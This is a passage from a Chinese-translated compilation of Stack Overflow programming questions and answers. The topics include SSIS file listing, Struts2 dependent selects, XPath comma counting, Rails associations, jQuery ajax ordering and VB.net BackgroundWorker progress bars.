    [System.AddIn.AddIn("ScriptMain", Version = "1.0", Publisher = "", Description = "")]
    public partial class ScriptMain : Microsoft.SqlServer.Dts.Tasks.ScriptTask.VSTARTScriptObjectModelBase
    {

        #region VSTA generated code
        enum ScriptResults
        {
            Success = Microsoft.SqlServer.Dts.Runtime.DTSExecResult.Success,
            Failure = Microsoft.SqlServer.Dts.Runtime.DTSExecResult.Failure
        };
        #endregion

        public void Main()
        {
        //Setup Connection String to SQL
            SqlConnection SQLConnection = new SqlConnection(
                                       //"user id=username;" +                  //UserName
                                       //"password=password;" +                 //Password
                                       "Trusted_Connection=true;" +             //Windows Auth
                                       "server=SERVERNAME;" +                   //SQL Server
                                       "database=DATABASENAME; " +              //SQL Database
                                       "connection timeout=30;" +               //connection timeout
                                       "Network Library=dbmssocn");             //TCP/IP Connection ("dbnmpntw" = Name Pipes)

        //Open the SQL Connection and remove the error code
            try
            {
                SQLConnection.Open();
            }
            catch (Exception OpenConnectionError)
            {
                Console.WriteLine(OpenConnectionError.ToString());
            }

        //Fetch a list of files from 'SourceNetworkFolderName' SSIS variable to an array called array1.
            string[] ArrayFileName = Directory.GetFiles(Dts.Variables["SourceNetworkFolderName"].Value.ToString());

        //Set up sql variable for table population
            SqlParameter SQLFileNameParam = new SqlParameter("@FileName", SqlDbType.VarChar, 100);

        //Loop through the array and insert into an SQL table
            foreach (string strFileName in ArrayFileName)
            {
            //Update sql variable with file names from array
                SQLFileNameParam.Value = strFileName;
            //Make the table insert
                SqlCommand SQLInsertToTable = new SqlCommand("INSERT INTO Archive_Extract_Network_Folder_File_List (FileName) VALUES (@FileName)", SQLConnection);
            //This snippit allows the use of the variable in the sql script.
                SQLInsertToTable.Parameters.Add(SQLFileNameParam);
            //Execute SqlCommand
                SQLInsertToTable.ExecuteNonQuery();
            //Clear the parameters and set the object to null    
                SQLInsertToTable.Parameters.Clear();
                SQLInsertToTable = null;
            }

        //Close the SQL Connection and remove the error code
            try
            {
                SQLConnection.Close();
            }
            catch (Exception CloseConnectionError)
            {
                Console.WriteLine(CloseConnectionError.ToString());
            }

        //Set array to null since it is no longer required.
            ArrayFileName = null;

        //Exit on success
            Dts.TaskResult = (int)ScriptResults.Success;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T03:13:52.127

在您的脚本中，只需构建一个文件名数组并将该数组设置为您的变量（确保该变量在脚本任务中设置为可写）。如果变量是对象类型，则可以在后续任务中使用 for 循环对其进行迭代，并对文件执行任何操作。你不应该只用一个脚本来创造任何奇迹。

将源目录下的所有文件放在一个数组中：

```
string[] array1 = Directory.GetFiles(Dts.Variables("SourceNetworkFolderName").Value.ToString()); 
```

将所有扩展名为“BIN”的文件放在一个数组中：

```
string[] array2 = Directory.GetFiles(Dts.Variables("SourceNetworkFolderName").Value.ToString(), "*.BIN"); 
```

您可能需要`System.IO`在脚本代码的顶部包含。

**编辑**：

将数组转换为列表以供循环任务处理。调用上面的代码后，调用这个：

```
List<string> fileList = new List<string>(astrTest);
Dts.Variables["SourceFilesInTheDirectory"].Value = fileList; 
```

您需要`System.Collections.Generic`在脚本文件的顶部包含。

# struts2 - 如何根据第一个选择中选择的选项填充第二个选择？

> ID：11751904
> 
> 赞同：0
> 
> 时间：2012-08-01T02:48:03.850
> 
> 标签：struts2, struts2-jquery-plugin

我正在使用 struts2-jquery-plugin。通常在我的表格中，我需要按**学校科目**从数据库中填充我的第一个选择，并且根据所选的学校科目，我需要更新第二个选择并由**教授该科目的教师**从数据库中填充它。

我在下面的链接中找到了上面的示例代码，但我猜不出它是如何工作的。他们不解释。 [http://struts2-jquery.appspot.com/home.action#](http://struts2-jquery.appspot.com/home.action#)。

我是否被迫使用 JSON？任何可以帮助我解决问题的解释或代码将不胜感激。

```
<label>First Select:</label> 
<sj:select id="firstSelect" name="firstSelect" onChangeTopics="firstSelectChanged" src="firstSelect.action"/> 
<label>Second Select:</label> 
<sj:select id="secondSelect" reloadTopics="firstSelectChanged" src="secondSelect.action" elementIds="firstSelect"/> 
```

**更新**

我尝试了这个链接[http://struts.jgeppert.com/struts2-jquery-showcase/index.action](http://struts.jgeppert.com/struts2-jquery-showcase/index.action)（**Ajax Link > AJAX Select**部分）在**nmc的**[这篇文章](https://stackoverflow.com/questions/11751904/struts2-jquery-plugin-how-to-populate-the-second-select-according-the-the-chose/11765981#11765981)中建议，但我得到这个错误：

 **```
Struts Problem Report
Struts has detected an unhandled exception: 

Messages: •There is no Action mapped for namespace / and action name echo.

--------------------------------------------------------------------------------

Stacktraces
There is no Action mapped for namespace / and action name echo. - [unknown location] 
    com.opensymphony.xwork2.DefaultActionProxy.prepare(DefaultActionProxy.java:177)
    org.apache.struts2.impl.StrutsActionProxy.prepare(StrutsActionProxy.java:61)
    org.apache.struts2.impl.StrutsActionProxyFactory.createActionProxy(StrutsActionProxyFactory.java:39)
    com.opensymphony.xwork2.DefaultActionProxyFactory.createActionProxy(DefaultActionProxyFactory.java:47)
    org.apache.struts2.dispatcher.Dispatcher.serviceAction(Dispatcher.java:458)
    org.apache.struts2.dispatcher.FilterDispatcher.doFilter(FilterDispatcher.java:395)
    org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:235)
    org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
    org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:233)
    org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:191)
    org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:127)
    org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:102)
    org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:109)
    org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:298)
    org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:859)
    org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:588)
    org.apache.tomcat.util.net.JIoEndpoint$Worker.run(JIoEndpoint.java:489)
    java.lang.Thread.run(Unknown Source) 
```

java Action 类：

```
package test.action;

import java.util.ArrayList;
import java.util.List;
import org.apache.struts2.convention.annotation.Action;
import org.apache.struts2.convention.annotation.Actions;
import org.apache.struts2.convention.annotation.ParentPackage;
import org.apache.struts2.convention.annotation.Result;

import com.opensymphony.xwork2.ActionSupport;

@ParentPackage( value = "showcase")
public class JsonSample extends ActionSupport {

      private static final long   serialVersionUID = -2223948287805083119L;
      private List<String>        languageList;
      private List<String>        reloadList;
      private String              language;

      @Actions( {
        @Action(value = "/jsonsample", results = {
          @Result(name = "success", type = "json")
        })
      })
      public String execute()
      {

        languageList = new ArrayList<String>();

        languageList.add("Java");
        languageList.add("PHP");
        languageList.add("C#");

        reloadList = new ArrayList<String>();
        if (language != null && language.equalsIgnoreCase("Java"))
        {
          reloadList.add("Struts2");
          reloadList.add("MyFaces");
          reloadList.add("Tapestry");
        }
        else if (language != null && language.equalsIgnoreCase("PHP"))
        {
          reloadList.add("CakePHP");
          reloadList.add("Symfony");
          reloadList.add("Zend");
        }
        else if (language != null && language.equalsIgnoreCase("C#"))
        {
          reloadList.add("NStruts");
          reloadList.add("ProMesh.NET");
          reloadList.add("Websharp");
        }

        return SUCCESS;
      }

      public String getJSON()
      {
        return execute();
      }

      public List<String> getLanguageList()
      {
        return languageList;
      }

      public List<String> getReloadList()
      {
        return reloadList;
      }

      public void setLanguage(String language)
      {
        this.language = language;
      }

    public String getLanguage() {
        return language;
    }

    public void setLanguageList(List<String> languageList) {
        this.languageList = languageList;
    }

    public void setReloadList(List<String> reloadList) {
        this.reloadList = reloadList;
    }

} 
```

JSP 页面：

```
<s:form id="formSelectReload" action="echo" theme="simple" cssClass="yform">
        <fieldset>
            <legend>AJAX Form</legend>
            <div class="type-text">
                <label for="language">Language: </label>
                <s:url id="remoteurl" action="jsonsample"/> 
                <sj:select 
                    href="%{remoteurl}" 
                    id="language" 
                    onChangeTopics="reloadsecondlist" 
                    name="language" 
                    list="languageList" 
                    listKey="myKey" 
                    listValue="languageList" 
                    emptyOption="true" 
                    headerKey="-1" 
                    headerValue="Please Select a Language"
                />
            </div>
            <div class="type-text">
                <label for="echo">Framework: </label>
                <s:url id="remoteurl" action="jsonsample"/> 
                <sj:select 
                    href="%{remoteurl}" 
                    id="selectWithReloadTopic" 
                    formIds="formSelectReload" 
                    reloadTopics="reloadsecondlist" 
                    name="echo" 
                    list="reloadList" 
                    emptyOption="true" 
                    headerKey="-1" 
                    headerValue="Please Select a Framework"
                />
            </div>
            <div class="type-button">
                <sj:submit 
                    id="submitFormSelectReload"
                    targets="result" 
                    value="AJAX Submit" 
                    indicator="indicator" 
                    button="true"
                    />
                    <img id="indicator" 
                        src="images/indicator.gif" 
                        alt="Loading..." 
                        style="display:none"
                    />
            </div>
        </fieldset>
    </s:form> 
```

当我从表单中删除**action="echo"**时，我没有更多错误，但结果我得到了图片中显示的某种包含。**当我单击 Ajax 提交时，我在结果中获得了选定的选项，而不是在结果 div 中获得了表单。**再次感谢你。

![在此处输入图像描述](../Images/9d997ae79c467783e7d38ed3598b9869.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T19:15:31.390

我认为您会在[http://struts.jgeppert.com/struts2-jquery-showcase/index.action](http://struts.jgeppert.com/struts2-jquery-showcase/index.action)找到更有用的示例，因为它们也有 Java 代码。在*Ajax Forms* --> *AJAX Select (Doubleselect)*下查看。

[该文档](http://code.google.com/p/struts2-jquery/wiki/SelectTag)也有一些很好的代码示例。

需要注意的一些事项：

**该操作必须返回 JSON。**

也就是说，填充标签`href`属性中引用的选择列表的操作`<sj:select>`必须返回 JSON，如示例中的注释所示：

```
@Actions({
    @Action(
    value="/jsonsample",
    results={
    @Result(name="success",type="json")
    })
}) 
```

还有一种方法可以在`struts.xml`文件中指定它。在 Stackoverflow 和互联网上应该有很多这样的例子。

**您的第二个选择应包括`formIds`属性**

它指定应序列化其字段值并与请求一起发送的表单。这就是填充第二个列表的操作如何接收在第一个列表中设置的值。**

# objective-c - 如何通过触摸仅添加一张图像

> ID：11751910
> 
> 赞同：0
> 
> 时间：2012-08-01T02:48:50.950
> 
> 标签：objective-c, cocoa-touch, uiimageview, uiimage, touchesbegan

致力于通过触摸将图像添加到视图中。到目前为止，我的代码允许我在触摸屏幕时添加我想要多次选择的相同图像。我希望能够一次添加一个图像，以便我可以操作添加的图像（放大/缩小、旋转、移动）。

我应该如何修改我的代码以允许这样做？

```
 -(void)touchesBegan:(NSSet *)touches withEvent:(UIEvent *)event
{
    UITouch * touch = [touches anyObject];
touchPoint = [touch locationInView:imageView];

  if (touchPoint.x > 0 && touchPoint.y > 0)
  {
    stampedImage = _imagePicker.selectedImage;   

    _stampedImageView = [[UIImageView alloc] initWithImage:stampedImage];
    _stampedImageView.multipleTouchEnabled = YES;
    _stampedImageView.userInteractionEnabled = YES;
    [_stampedImageView setFrame:CGRectMake(touchPoint.x, touchPoint.y, 80.0, 80.0)];
    _stampedImageView.center = touchPoint;
    [imageView addSubview:_stampedImageView];
    [_stampedImageView release];

  }
} 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T04:22:32.120

如果我明白你想要什么，你需要继承 UIImageView 并在该子类中实现 touchesBegan （和/或手势识别器方法）。在您发布的代码中，您应该更改：

```
_stampedImageView = [[UIImageView alloc] initWithImage:stampedImage]; 
```

至：

```
_stampedImageView = [[CustomImageView alloc] initWithImage:stampedImage]; 
```

其中 CustomImageView 是您的 UIImageView 子类。如果您这样做，那么自定义视图中的任何触摸都将由该类中的代码处理，而不是包含视图。

如果您触摸子类 imageView 之外的某个地方，您仍然会再次添加相同的视图。如果你想抑制它，你必须添加一个属性来跟踪最后选择的图像，并放入一个 if 子句，如果它包含该图像，则不会添加图像视图。

# javascript - 当仅给出宽度或高度时，所有浏览器是否都会按比例缩放图像？

> ID：11751911
> 
> 赞同：0
> 
> 时间：2012-08-01T02:48:55.373
> 
> 标签：javascript, image, scaling, dimensions, dimension

我注意到，如果我只指定图像的一个维度，或者使用标签上的`width`and`height`属性`img`或使用 CSS，浏览器会自动按比例缩放另一个维度。

例如，如果我有一个 100x150 的图像，并且我指定`width="50"`or `width:50px;`，浏览器会自动将高度设置为 75 像素。

这种行为是否适用于所有浏览器？我可以省略一个只是为了节省时间吗？我正在使用 JavaScript 预加载图像并动态插入它们，因此我不必担心下载时图像会影响布局。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-01T04:05:28.773

是的，这是[CSS2 规范](http://www.w3.org/TR/CSS21/visudet.html#inline-replaced-width)的一部分：

> [...] 如果 'width' 的计算值为 'auto'，则 'height' 有一些其他的计算值，并且该元素确实具有内在比率；那么'width'的使用值是：
> 
> ```
> (used height) * (intrinsic ratio) 
> ```

定义的 CSS 宽度或高度将在任何兼容 CSS2 的浏览器中正确缩放它们（我在 IE6 及更高版本中对其进行了测试）。

我认为这是一个非常有用的功能。假设我有一个`800px`宽度布局的论坛，我允许用户上传图片。将帖子的图像设置为`max-width:790px`没有定义的高度（`height:auto`默认情况下）将自动使它们适合而不破坏我的布局，同时保持正确的纵横比。整洁的东西。*注意：[`max-width`](https://developer.mozilla.org/en/CSS/max-width#Browser_compatibility)IE6 不支持。*

显然，如果您定义一个`height`具有`width:auto`.

这是一个用于测试的[**小提琴。**](http://jsfiddle.net/7rtgW/)显然，HTML 属性也可以在几乎所有浏览器中正确缩放。但我仍然建议使用 CSS 进行元素样式设置，以保持一致性并保持标记干净。样式应该通过 CSS 完成。

# xpath - 使用 xpath 计算逗号的数量

> ID：11751913
> 
> 赞同：1
> 
> 时间：2012-08-01T02:49:11.637
> 
> 标签：xpath

我正在尝试编写一个 xpath 表达式来计算元素中逗号的数量。有可能这样做吗？如果是的话，那么有人可以帮我表达一下。我需要计算节点中的逗号。

```
<SOISWPUpload>
  <User>admin</User>
  <SWPIdentifiers>,,,,,U,,,SWP,20120630,,,,4113,,COAC,TLMCOAC
,,,,,U,,,SWP,20120630,,,,4113,,COAC,TLMCOAC</SWPIdentifiers>
</SOISWPUpload> 
```

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T04:16:24.877

**Use**:

```
string-length() - string-length(translate(., ',', '') 
```

In this concrete case you may want to specify the context-node:

```
string-length(/*/SWPIdentifiers) - string-length(translate(/*/SWPIdentifiers, ',', '') 
```

# ruby-on-rails - 获取外键表中的 n 条最新记录 (Rails ActiveRecord)

> ID：11751917
> 
> 赞同：0
> 
> 时间：2012-08-01T02:50:00.563
> 
> 标签：ruby-on-rails, database, activerecord, model

这里简单的问题。

我有一个用户表。每个用户都有许多目标。每个目标都有许多目标。每个目标都有一`created_at`列。

我想获得为用户创建的 10 个最新目标（无论任何特定目标），但我不确定如何构建 ActiveRecord 查询。

一般来说，我知道如何获得 10 个最近的目标。您将执行以下操作：

```
Objective.find(:all, :limit => 10, :order => 'created_at desc') 
```

但我不知道如何获取特定用户的 10 个最新目标（即从用户 -> 目标 -> 目标）。

我该怎么做呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T03:02:23.903

用一个`has_many :through`

```
class User < ActiveRecord::Base
  has_many :goals
  has_many :objectives, :through => :goals
end 
```

现在，无论何时，无论`user.objectives`目标如何，您都会获得用户的所有目标。

所以为了得到最新的目标：

```
user = User.find(your_id)
latest_objectives = user.objectives.order('created_at desc').limit(10) 
```

# c# - 如何在winrt中解压缩SharpZipLib压缩的字符串？

> ID：11751924
> 
> 赞同：2
> 
> 时间：2012-08-01T02:50:40.517
> 
> 标签：c#, zip, windows-runtime

我找不到 SharpZipLib 的 WinRT 版本，并且 System.IO.Compression.GZipStream 无法解压缩 Zip 流。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-01T03:13:04.013

SharpZipLib[源代码](http://www.icsharpcode.net/opensource/sharpziplib/Download.aspx)是否在 WinRT 上编译>

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2012-08-01T09:13:02.977

SharpZipLib 纯粹是一个托管库。在 WinRT 上应该可以使用相同的二进制文件。如果没有，只需为您的目标平台自己编译源代码。

如果做不到这一点，请查看 DotNetZip - [http://dotnetzip.codeplex.com/](http://dotnetzip.codeplex.com/)

# javascript - 文本框无法在 javascript 中正确动态更新

> ID：11751925
> 
> 赞同：0
> 
> 时间：2012-08-01T02:51:12.547
> 
> 标签：javascript, textbox, setattribute

这是我创建文本框的方法：

```
box = document.createElement("input"); 
```

这是我更改文本的方法：

```
box.setAttribute('value',myString); 
```

**但是，在我编辑后**，每个文本框都会对上述代码**永久无响应**（在 Firefox 中，即使单击它也会导致这种情况）。

 **另外，我有时想阻止用户表单编辑值：

```
box.setAttribute('readonly','true'); 
```

但这也会导致这些框永久锁定，无法尝试编辑它们的程序；box.setAttribute('readonly','false') 不会撤消锁定。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T02:55:12.137

要删除只读属性，您必须使用`box.removeAttribute('readonly');`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-01T02:57:22.420

您应该使用`box.value = myString`和`box.readOnly = false`。节点属性总是字符串，如果你想删除一个你需要使用`element.removeAttribute('atribute_name')`.**

# ios - 将下载的图像与保存的图像进行比较？

> ID：11751931
> 
> 赞同：0
> 
> 时间：2012-08-01T02:51:58.877
> 
> 标签：ios, cocoa-touch, ipad, uiimage, comparison

我想将我从服务器下载的图像与保存到包中的图像进行比较，看看它是否是相同的图像。我将如何在 iOS 中实现这一点？

谢谢！

碎纸机

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-01T06:06:25.763

如果您想知道它是否是*同一张*图像，那么您应该只使用哈希函数。

如果您已经决定应该使用什么散列函数，那么您甚至可以让服务器向您发送图像的散列并将其与图像的本地散列进行比较，而不是向您发送图像本身。

如果哈希匹配，则根本不需要下载图像。另一方面，如果哈希值不同，那么您知道您需要下载新图像。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-01T06:07:21.190

如果期望图像完全相同，而不是重新压缩或其他任何东西，您可以在`NSData`object 中加载两者并将其与`isEqualToData:`.

如果它们可能具有不同的元数据，但图像仍然相同，那么您可以将它们作为图像加载并使用类似于此的解码比较实际图像像素：[如何从 UIImage (Cocoa Touch) 或 CGImage (Core图形）？](https://stackoverflow.com/questions/448125/how-to-get-pixel-data-from-a-uiimage-cocoa-touch-or-cgimage-core-graphics).

如果它们相似，但格式可能不同或重新压缩，那么您需要图像比较软件，例如[OpenCV](http://opencv.org/)。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T05:59:48.663

首先你可以比较图像大小然后大小相同然后你可以在[图像比较中使用答案](https://stackoverflow.com/questions/3474204/image-comparison-using-objective-c)

# javascript - jquery执行行为

> ID：11751933
> 
> 赞同：-2
> 
> 时间：2012-08-01T02:52:18.533
> 
> 标签：javascript, jquery

```
$(document).ready(function () {
    $('.out').each(function(index) {
       .ajax({                      
          url: "php,
          type: "GET",
          success: function(data) {
          // LOOP each dynamic textbox for my specific validation
         console.log('1'); // flag if any error
       }
    });

    // I though this will run after  $('.out').each()
    console.log('2'); // my plan is to check if atleast 1 error occur
});

result:
> 2
> 1
> 1
> 1

instead of:
> 1
> 1
> 1
> 2 
```

我认为流程将是，首先运行每个函数，它会显示 1 1 1 等，然后会显示 2。有人可以帮我完成我需要的吗？

提前致谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T04:46:06.937

Assuming you corrected the syntax errors in your code (missing `$` before `.ajax`, missing `"` on `url` value, and missing closing `});` on the `$.ajax` call, plus any other errors I didn't spot):

```
$(document).ready(function () {
    $('.out').each(function(index) {
       $.ajax({                     
          url: "php",
          type: "GET",
          success: function(data) {
            // LOOP each dynamic textbox for my specific validation
            console.log('1'); // flag if any error
          }
       });
    });

    console.log('2'); // my plan is to check if atleast 1 error occur
}); 
```

Then the order the statements within your ready function will be executed is first the `.each()` will call `$.ajax()` for each of the `'.out'` elements, then the `console.log('2')` at the end will be executed and the ready function will complete, then *later* the success function will be called for each Ajax request *in the order the Ajax responses are received by the browser* - which isn't necessarily the same order the Ajax requests were made. (Obviously this assumes they actually *are* successful.)

This is because Ajax requests are (supposed to be) *asynchronous* - the response callbacks will always be called after the current block of code finishes, regardless of how fast the response is received, because (ignoring web workers) JavaScript is not multi-threaded.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-01T03:25:06.113

如前所述，Ajax 是异步的，这意味着您的 console.log('2') 语句可能会在调用成功函数之前执行。

尝试这样的事情：

```
$(document).ready(function () {
    $('.out').each(function(index) {
       $.ajax({                      
          url: "yourUrl.php",
          type: "GET",
          success: function(data) {
              // LOOP each dynamic textbox for my specific validation
              console.log('1'); // flag if any error
          },
          complete: function (jqXHR, textStatus){
              //This will be be called when the request finishes 
              //(after success and error callbacks are executed)
              console.log('2'); // my plan is to check if atleast 1 error occur
          }
       });
    });
}); 
```

看看这里以更好地理解 jQuery ajax 调用： [http ://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

# java - Android，Swarm：如何在同一个线程上下载多个排行榜？

> ID：11751938
> 
> 赞同：0
> 
> 时间：2012-08-01T02:53:22.917
> 
> 标签：java, android

我正在编写使用 Swarm 数据库的 android 游戏。我的问题是他们只允许存储一个变量，而我需要三个。所以我创建了九个排行榜来代表不同的变量集。

当我需要在我的应用程序中显示分数时，我需要来自所有排行榜的数据，并且我从 Swarm 数据库发出九个请求，但这会创建九个线程。

有没有办法只使用一个线程？也许使用 Thread.join() 方法？一次完成所有下载。或者这将花费更多时间？

谢谢：）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-24T19:07:17.880

假设您的意思是与每个排行榜分数相关的数据只能是一个变量：

我认为正确的答案是定义一种数据格式来提交所有数据，作为一个变量。例如，如果您要提交 3 个整数，为什么不将它们提交为 "int1,int2,int3" 并期望它们以这种方式返回呢？或者利用 JSON 并将您的数据作为 JSON 数组“[int1,int2,int3]”附加到分数。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-24T16:46:26.057

看起来（正如您所指出的）您可以提交带有排行榜分数的有效负载数据，但如果您只想要通用数据存储，那么可能应该使用云数据功能。你是正确的，每个调用都会产生一个单独的线程，但在 9 个线程的情况下，这不应该真正影响性能。另外，我猜一旦数据返回，线程无论如何都会被杀死。

只是好奇，将线程数从 9 减少到 1 的动机是什么？如果您需要与 Swarm 支持团队联系，我认为您可以通过发送电子邮件至 support@swarmconnect.com 与他们联系。他们通常反应灵敏。

# wordpress - Wordpress - 具有相关帖子类型的前端用户个人资料页面

> ID：11751940
> 
> 赞同：0
> 
> 时间：2012-08-01T02:53:51.763
> 
> 标签：wordpress, profile

我想要做的是为网站用户提供前端个人资料页面。

我尝试的一种方法是创建一个自定义更新配置文件页面，如下所示：（[http://4rapiddev.com/php/create-custom-update-profile-page-for-wordpress-users/](http://4rapiddev.com/php/create-custom-update-profile-page-for-wordpress-users/)）。我设法将其设置为只有注册用户才能访问该页面。

现在是困难的部分（至少对我来说）。我需要找到一种将特定自定义帖子类型（在本例中为“徽章”）与单个用户相关联的方法。这样，当特定用户访问该页面时，将显示这些徽章。

我想到的另一种方法是在每次用户注册时以某种方式创建一个新页面。该新页面将与用户具有相同的名称，并且能够获取通常来自于在 WP-Admin 中查看其个人资料的信息。我设法找到了一个可以将自定义帖子类型与页面相关联的插件（[http://wordpress.org/extend/plugins/custom-post-types-relationships-cptr/](http://wordpress.org/extend/plugins/custom-post-types-relationships-cptr/)）

我试过四处寻找这两种方法，但两端都空手而归。任何人都可以帮助我或指出我正确的方向吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-17T22:04:06.837

据我了解，您是在问（在消息的第一部分）如何将用户与自定义帖子类型相关联，对吗？由于每个帖子都需要一个所有者，我想您可以将这些徽章视为自定义帖子，并将用户视为这些帖子的所有者。您可以在每个用户的个人资料中自动列出这些自定义帖子。如果您遵循这个逻辑，还缺少什么？

# .net - VB.net 2010 backgroundworker 更新表单进度条

> ID：11751942
> 
> 赞同：0
> 
> 时间：2012-08-01T02:54:01.497
> 
> 标签：.net, vb.net, winforms, progress-bar, backgroundworker

试图了解后台工作人员:)

```
Imports System.Threading
Imports System
Imports System.IO
Imports System.Windows.Forms
Imports System.ComponentModel
Imports System.Text.RegularExpressions
Imports System.Text
Imports System.Diagnostics
Imports System.Drawing

Public Class CLViewForm

Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
    BackgroundWorker1.RunWorkerAsync()
End Sub

Function SystemLoads()
    Dim PCV As Integer = Convert.ToDecimal(PerformanceCounter1.NextValue())
    Me.Label5.Text = PCV & " %"
    Me.ProgressBar1.Minimum = 0
    Me.ProgressBar1.Maximum = 100
    Me.ProgressBar1.Step = 1
    Me.ProgressBar1.Value = PCV
    Me.Label6.Text = Now.ToLongTimeString
    Return 0
End Function

Private Sub BackgroundWorker1_DoWork(sender As Object, e As DoWorkEventArgs) Handles BackgroundWorker1.DoWork
    Me.Invoke(SystemLoads())
    End Sub
End Class 
```

我正在尝试做的基本要点是加载一个后台工作程序，它在主窗体上更新 3 个内容一个进度条，显示当前系统加载一个文本标签，按百分比显示负载和一个时钟

我知道我可以用一个简单的计时器来完成这一切，但是当我添加其他计时器时，它往往会使表单变得迟缓，所以我想学习如何将我想做的大部分事情拍摄到背景中线。

我对这一切都很陌生，所以我不知道如何调用这些东西并对其保持线程安全，因此我收到一个错误[当然，这就是我在这里问的原因:)]，上面写着“vb.net cross -线程操作无效控制'progressbar1'从一个线程访问，而不是它被调用“

或类似的东西。

使用我提供的代码示例如何使后台线程更新表单的进度条和 % 标签？

TIA

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-01T08:17:11.947

我试图在这里创建一个简单的例子。通过使用委托，您在正确的路线上，但我认为您的实施有点偏离。

您需要一个具有`label`、 a`progressbar`和控件的表单，然后将以下代码放入：`backgroundworker`

```
Private Sub TestForm_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
    'Start the worker
    BackgroundWorker1.RunWorkerAsync()
End Sub

Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
    'simulate long running processes
    UpdateStatus(0, "Loading")
    System.Threading.Thread.Sleep(1000)
    UpdateStatus(33, "One third of the way through")
    System.Threading.Thread.Sleep(1000)
    UpdateStatus(66, "Two thirds of the way through")
    System.Threading.Thread.Sleep(1000)
    UpdateStatus(100, "Finished")
End Sub

'all calls to update the progress bar and label go through here
Private Sub UpdateStatus(ByVal progress As Integer, ByVal status As String)
    Try
        If Me.InvokeRequired Then
            Dim cb As New UpdateStatusCallback(AddressOf UpdateStatusDelegate)
            Me.Invoke(cb, New Object() {progress, status})
        Else
            UpdateStatusDelegate(progress, status)
        End If
    Catch ex As Exception
        MessageBox.Show("There was an error " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
    End Try
End Sub

Private Delegate Sub UpdateStatusCallback(ByVal progress As Integer, ByVal status As String)

'This catually updates the control - modify the paramters and update to suit the control you are using
Private Sub UpdateStatusDelegate(ByVal progress As Integer, ByVal status As String)
    ProgressBar1.Value = progress
    Label1.Text = status
End Sub 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-08-24T05:02:35.233

我使用的技巧很可怕，但它有效：

```
 pgbMain.Maximum += 1
            pgbMain.Value += 2
            pgbMain.Value -= 1
            pgbMain.Maximum -= 1 
```

或者你可以使用：

```
 i = pgbMain.Value + 1
            pgbMain.Value = pgbMain.Maximum
            pgbMain.Value = i 
```

但是后一种方法意味着最后一步像往常一样延迟，因为没有“后退”步骤。（不，这两种方法都无法在视觉上检测到。）

手动调整进度条 Value 属性时，您可以在 WinForm 上看到它逐渐移动到更高的值，但立即移动到更低的值。所以这似乎摆脱了滞后。可悲的是。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-01T03:05:17.027

为后台工作者 RunWorkerCompleted 和 ProgressChanged 创建一个事件
**。C#**

```
this.backgroundWorker.ProgressChanged += new System.ComponentModel.ProgressChangedEventHandler(/* the event method */);
this.backgroundWorker.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(/* the event method */); 
```

另外，不要忘记将 WorkerReportsProgress 设置为 true..

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-08-19T03:50:05.020

进度条有点傻和令人困惑。我不得不求助于将我所有的工作保持在相同的形式（如果可以的话）。因此，在您的情况下，我可能会尝试在相同形式的过程中执行您的系统加载。这对我有用。我希望它有所帮助。我已经粘贴了一些可能解释它的代码（不能让它正确格式化，所以很抱歉），但简而言之：

1.  我从启动 Do-work 事件的 Me.BackgroundWorker.RunWorkerAsync() 开始。
2.  调用 BackgroundWorker_DoWork （调用您想要完成工作并报告的 Proc）
3.  您的 Proc 完成工作并将使用 BackgroundWorker.ReportProgress 进行报告

**宣言**

```
Public Event DoWork As DoWorkEventHandler
Public Event PrgRprt As ProgressChangedEventHandler
Public g_intProgress As Integer 
```

**进度条信息**

```
 Private Sub btnStepOne_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnStepTwo.Click
    'Calls  BackgroundWorker_DoWork, which in turn calls step One
    Me.BackgroundWorker1.RunWorkerAsync()
End Sub

Private Sub BackgroundWorker1_DoWork(ByVal sender As Object, ByVal e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker2.DoWork
    'Called from Me.BackgroundWorker1.RunWorkerAsync()
    'calls step One proc, where the work is done
    Call StepOne(strInput)
End Sub

Private Function StepOne(strInput as string)as string
   'this is where I do my work that the progress bar will monitor   
